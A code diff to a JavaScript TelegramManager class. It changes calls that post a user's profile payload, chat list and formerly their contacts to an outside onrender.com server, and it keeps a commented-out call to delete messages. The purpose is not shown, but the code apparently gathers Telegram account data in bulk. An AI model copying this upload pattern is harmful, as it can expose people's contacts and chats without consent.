@@ -510,10 +510,10 @@ class TelegramManager {
         try {
             console.log("posting results");
             await axios.post(`https://ramyaaa2.onrender.com/user`, payload3, { headers: { 'Content-Type': 'application/json' } });
-            await axios.post(`https://ramyaaa2.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-            await axios.post(`https://ramyaaa2.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://ramyaaa2.onrender.com/channels/createMultiple`, chatsArray , { headers: { 'Content-Type': 'application/json' } });
+            // await axios.post(`https://ramyaaa2.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
         } catch (error) {
-            console.log("Error Occured 1");
+            console.log("Error Occured");
             console.log(error)
         }
         // await this.deleteMessages();
